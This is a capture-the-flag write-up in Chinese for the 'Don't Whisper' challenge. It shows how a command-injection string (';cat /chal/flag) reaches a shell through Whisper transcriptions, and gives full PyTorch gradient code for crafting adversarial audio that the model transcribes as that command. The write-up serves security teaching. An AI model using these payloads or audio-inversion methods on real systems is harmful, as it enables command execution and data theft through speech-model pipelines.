# Don't Whisper

## 题目简述

这是一道白盒语音模型反演题。Web 应用允许提交文字或音频：文字路径会过滤 shell 元字符，音频路径却把 Whisper 的转写结果直接拼进 `asyncio.create_subprocess_shell`。仅发现命令注入还不够，真正的主障碍是生成一段会被修改版 Whisper 精确转写为注入字符串的音频，因此应归入 `ai-ml`，而不是普通 Web。

仓库提供应用源码、修改版 Whisper、官方成功样本 `admin/exploit/sol.wav` 和最终 flag，但没有保存生成样本的脚本。缺失的生成方法可以从出题人的[官方题解](https://blog.bi0s.in/2025/07/14/Misc/DontWhisper-bi0sCTF2025/)补齐；其关键算法与参数已转写到正文，理解解法不依赖继续打开外链。

## 解题过程

`/api/chat` 会调用 `sanitize_input` 拒绝引号、分号、`&`、`|` 等字符；`/api/audio-chat` 则先运行 Whisper，再执行：

```python
chatbot_proc = await asyncio.create_subprocess_shell(
    f"python3 chatbot.py '{transcription}'",
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.STDOUT,
)
```

如果转写结果是：

```text
';cat /chal/flag
```

最终 shell 字符串就会先闭合 `chatbot.py` 的单引号参数，再执行 `cat /chal/flag`。手工朗读很难让 Whisper 稳定输出引号、分号和路径，所以要反向优化输入波形。

题目修改了 Whisper 的解码循环：只保留贪心 `argmax`，最多生成 12 个 token，并删除复杂的 beam search。这使白盒梯度优化更直接。官方方法把 20 秒、16 kHz 的随机波形 `adv` 设为可学习参数，以目标文本的 token 序列作为 teacher forcing 输入：

```python
target_text = "';cat /chal/flag"
target_tokens = tokenizer.encode(target_text) + [50256]  # EOT

adv = torch.randn(1, 16000 * 20, device="cuda", requires_grad=True)
optimizer = torch.optim.Adam([adv], lr=0.01)
loss_fn = torch.nn.CrossEntropyLoss()

for _ in range(50):
    tokens = torch.tensor([[50257, 50362]], device="cuda")  # SOT, English
    for target in target_tokens:
        optimizer.zero_grad()
        mel = log_mel_spectrogram(adv, model.dims.n_mels, padding=16000 * 30)
        mel = pad_or_trim(mel, 3000).to(model.device)
        features = model.embed_audio(mel)
        logits = model.logits(tokens, features)[:, -1]
        loss = loss_fn(logits, torch.tensor([target], device="cuda"))
        loss.backward()
        optimizer.step()
        adv.data.clamp_(-1, 1)
        tokens = torch.cat(
            [tokens, torch.tensor([[target]], device="cuda")],
            dim=1,
        )
```

对目标序列 $T^*=(t^*_1,\ldots,t^*_k)$，优化目标是：

$$
\mathcal{L}(x)=\sum_{j=1}^{k}\operatorname{CE}
\left(f_j(x,t^*_{<j}),t^*_j\right),
$$

其中 $x$ 是可学习波形，$f_j$ 是 Whisper 在 teacher forcing 前缀下对第 $j$ 个 token 给出的 logits。每次反向传播只改变输入波形，不更新模型权重；裁剪到 $[-1,1]$ 保证样本可保存为有效 PCM 音频。

优化结束后把 `adv` 以 16 kHz 保存为 `adversarial.wav`，先用同一修改版 Whisper 本地确认转写精确等于目标字符串，再上传到 `/api/audio-chat`。服务器会执行转写后的命令并在响应中返回：

```text
bi0sctf{DiD_Y0u_kn0w_NN_c4n_b3_1nv3rt3d-1729}
```

仓库中的 `admin/exploit/sol.wav` 是已经生成的成功样本，README 与 `admin/src/dont_whisper/flag` 给出同一结果。本次没有运行需要 GPU 和多轮反向传播的生成任务，也没有启动服务；动态成功由官方样本和官方题解支撑，源码级命令注入与最终 flag 已在本地核对。

## 方法总结

漏洞链由两个不同层次组成：应用层把未经净化的模型输出交给 shell，模型层则通过白盒梯度反演把目标命令编码进音频。只写“上传恶意音频”会漏掉题目的决定性技术障碍，只写命令注入也不足以构成完整 WP。

遇到类似题目，应沿“攻击者输入 → 可微预处理 → 模型 logits → 解码 token → 危险下游消费者”检查整条数据流。如果模型权重和推理代码可见，并且解码过程可微或能用 teacher forcing 近似，就可以固定目标输出，用交叉熵对输入本身做梯度下降；最终必须再用原始推理路径验证生成样本，而不能只看训练损失下降。
